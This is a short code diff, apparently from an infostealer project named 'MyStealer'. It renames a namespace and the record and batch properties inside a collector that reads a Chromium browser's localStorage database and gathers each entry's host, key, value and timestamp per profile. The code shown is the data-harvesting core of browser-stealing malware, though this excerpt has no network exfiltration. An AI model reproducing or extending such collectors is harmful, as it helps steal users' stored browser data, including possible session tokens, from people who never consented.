@@ -1,4 +1,4 @@
-﻿using MyStealer.Handler.Chromium;
+﻿using MyStealer.Utils.Chromium;
 using Newtonsoft.Json.Linq;
 using Serilog;
 using System;
@@ -233,18 +233,18 @@ namespace MyStealer.Collectors.Browser
 
             foreach (var record in localStorageDb.iter_all_records())
             {
-                var batch = localStorageDb.find_batch(record.leveldb_seq_number);
+                var batch = localStorageDb.FindBatch(record.Seq);
                 var timeStamp = DateTime.MinValue;
                 if (batch != null)
-                    timeStamp = batch.timestamp;
+                    timeStamp = batch.TimeStamp;
 
                 set.Add(new LocalStorageEntry
                 {
                     ApplicationName = ApplicationName,
                     ApplicationProfileName = profileName,
-                    Host = record.storage_key,
-                    Key = record.script_key,
-                    Value = record.value,
+                    Host = record.StorageKey,
+                    Key = record.ScriptKey,
+                    Value = record.Value,
                     AccessTimeStamp = timeStamp
                 });
             }
